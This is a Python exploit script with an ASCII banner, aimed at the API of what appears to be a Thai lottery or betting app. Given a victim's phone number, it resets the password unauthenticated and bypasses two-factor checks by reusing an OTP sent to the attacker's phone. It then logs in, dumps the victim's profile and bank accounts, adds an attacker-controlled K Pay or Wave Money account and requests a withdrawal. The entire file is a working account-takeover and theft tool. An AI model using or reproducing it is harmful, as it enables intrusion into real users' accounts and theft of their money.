import requests
import sys
import os
import json,string
import random

os.system('clear')
print('''

88888 8   8    db    888    
  8   8www8   dPYb    8     
  8   8   8  dPwwYb   8     
  8   8   8 dP    Yb 888    
                            
d88b 888b.    d88b 888b.    
" dP 8   8     wwP 8   8    
 dP  8   8       8 8   8    
d888 888P'    Y88P 888P'                     
''')

print("Exploit running ...")
random = ''.join(random.choice(string.ascii_lowercase) for i in range(10)) 
useragent = "Mozila Firefox-%s" %(random)
r = requests.session()
victim = sys.argv[1]
change_pass = r.post("https://apinew.thai2d3d.com/api/user/setNewPassword?phoneNo=%s&password=133702" %(victim))
if change_pass.text == 'true':
    print("Password changed for ",victim)

def _login():
    login_endpoint = "https://apinew.thai2d3d.com/api/Authenticate/login"
    _data = {"phone_no":"%s"%(victim),"password":"133702","app_version":"1.2.8","fcmtoken":"null","deviceId": useragent,"ipAddress":""}
    data = json.dumps(_data, indent = 4)
    #print(json_object)
    login = r.post(login_endpoint,data,headers={"Content-type":"application/json"})
    if login.status_code == 404:
        print("Phone number or Password is invalid !")
    elif login.status_code == 304:
        print("Bypassing 2FA Authentication ... \n")
        attacker = input("Enter your phone number: ")
        req_otp = r.get("https://apinew.thai2d3d.com/api/user/getForgotPassowrdOTP?phoneNo=%s"%(attacker))
        request_id = json.loads(req_otp.text)['request_id']
        code = input("Emter 6-digit OTP code: ")
        guid_endpoint = "https://apinew.thai2d3d.com/api/user/getRegisterDeviceOTP?phoneNo=%s"%(victim)
        get_guid = r.get(guid_endpoint)
        guid = json.loads(get_guid.text)['guid']
        update_endpoint = "https://apinew.thai2d3d.com/api/user/updateDeviceId"
        _update_data = {"deviceId": useragent,"phone_no":victim,"ipAddress":"","guid":guid,"request_id":request_id,"code":code,"password":""}
        update_data = json.dumps(_update_data, indent = 4)
        deviceid_update = r.post(update_endpoint,update_data,headers={"Content-type":"application/json"}) 
        if 'success' in deviceid_update.text:
            print("Successfully bypass 2FA ")
            return _login()
    elif login.status_code == 200:
        print("Login successfully !")
        print()
        token = json.loads(login.text)['token']
        print(token)
        headers = {"Authorization":"Bearer %s"%(token),"Content-type":"application/json"}
        print("Getting victim info ... ")
        print(r.get("https://apinew.thai2d3d.com/api/user/PointUserProfile",headers=headers).text)
        print("Getting Bank Accounts ...")
        print(r.get("https://apinew.thai2d3d.com/api/userbankaccount/getuserbankaccount-byUserId",headers=headers ).text)
        def func_add_bank():
            print()
            print("Add your user_bank account ___")

            print('''

            [1]. K Pay
            [2]. Wave Money

            ''')
            global choice
            
            choice = int(input("Choose a number: "))
            number = input("Enter banking phone number: ") 
            add_bank_endpoint = "https://apinew.thai2d3d.com/api/userbankaccount/insertuserBankAccount"
            if choice == 1:
                choice = 4
            elif choice == 2:
                choice = 5
            add_bank_data = [{"account_number":number ,"payment_id":choice}]
            add_bank = r.post(add_bank_endpoint,json=add_bank_data,headers=headers)

            print(add_bank.text)
            print()
            
            print("Getting Bank Accounts ...")
            print(r.get("https://apinew.thai2d3d.com/api/userbankaccount/getuserbankaccount-byUserId",headers=headers ).text)
        func_add_bank()

        def withdraw():
            print ("Withdraw money !!")
            amount = input("Amount to withdraw: ")
            acc_number = input("Phone number to withdraw: ")
            withdrawal_endpoint = "https://apinew.thai2d3d.com/api/transaction/withdrawalRequest"
            _withdrawal_data = {"login_password":"133702","payment_id":choice,"amount":amount,"account_no":acc_number,"remark":""}
            withdrawal_data = json.dumps(_withdrawal_data, indent = 4)
            withdrawal = r.post(withdrawal_endpoint,data=withdrawal_data,headers=headers)
            print(withdrawal.text)
        withdraw()
_login()